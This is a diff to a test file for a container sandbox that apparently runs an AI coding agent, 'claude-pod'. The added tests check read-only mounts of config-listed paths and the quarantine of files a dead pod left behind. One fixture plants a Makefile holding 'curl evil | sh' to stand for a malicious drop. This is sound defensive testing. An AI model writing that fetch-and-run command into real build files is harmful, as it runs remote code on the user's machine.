@@ -70,6 +70,18 @@ test('the core.hooksPath folder is mounted read-only', async () => {
   assert.ok(s.runs()[0].args.includes(`${p}:${p}:ro`));
 });
 
+test('readOnly paths from a trusted config are mounted read-only; missing ones are not mounted', async () => {
+  const s = ready();
+  fs.mkdirSync(path.join(s.project, 'scripts'));
+  fs.writeFileSync(path.join(s.project, 'claude-pod.config.json'), JSON.stringify({ readOnly: ['scripts', 'Makefile'] }));
+  await trustConfig(s);
+  const res = await cli(['exec', 'true'], { cwd: s.project, env: s.env });
+  assert.equal(res.code, 0, res.stderr);
+  const p = path.join(s.project, 'scripts');
+  assert.ok(s.runs()[0].args.includes(`${p}:${p}:ro`));
+  assert.ok(!s.runs()[0].args.some((a) => a.includes(path.join(s.project, 'Makefile'))));
+});
+
 test('run --prompt goes over stdin, not argv', async () => {
   const s = ready();
   const res = await cli(['run', '--prompt', 'secret plan'], { cwd: s.project, env: s.env });
@@ -134,13 +146,22 @@ test('files left by a pod whose launcher died are quarantined on the next launch
   // What a killed launcher leaves behind: its record, and the file its pod planted.
   const pending = path.join(s.hostDir, 'pending');
   fs.mkdirSync(pending, { recursive: true });
-  fs.writeFileSync(path.join(pending, 'claude-pod-app-dead01.json'), JSON.stringify({ root: s.project, name: 'claude-pod-app-dead01', missing: ['.mcp.json', '.envrc'] }));
+  fs.writeFileSync(path.join(pending, 'claude-pod-app-dead01.json'), JSON.stringify({
+    root: s.project, name: 'claude-pod-app-dead01', missing: ['.mcp.json', '.envrc', 'Makefile', '../outside', '.git/hooks', './infra'],
+  }));
   fs.writeFileSync(path.join(s.project, '.mcp.json'), '{"planted":true}');
+  fs.writeFileSync(path.join(s.project, 'Makefile'), 'all:\n\tcurl evil | sh\n'); // a readOnly entry
+  // Entries no config could produce are ignored, never renamed.
+  fs.mkdirSync(path.join(s.dir, 'work', 'outside'), { recursive: true });
+  fs.mkdirSync(path.join(s.project, 'infra'));
 
   const res = await cli(['exec', 'true'], { cwd: s.project, env: s.env });
   assert.equal(res.code, 0, res.stderr);
   assert.match(res.stderr, /created \.mcp\.json.*Quarantined/);
   assert.ok(!fs.existsSync(path.join(s.project, '.mcp.json')));
+  assert.ok(!fs.existsSync(path.join(s.project, 'Makefile')), 'readOnly entry quarantined');
+  assert.ok(fs.existsSync(path.join(s.dir, 'work', 'outside')) && fs.existsSync(path.join(s.project, 'infra')));
+  assert.ok(fs.existsSync(path.join(s.project, '.git', 'hooks')));
   assert.ok(!s.runs()[0].args.some((a) => a.includes('.mcp.json')), 'not mounted as if it were yours');
   assert.deepEqual(fs.readdirSync(pending), [], 'records cleared');
 });
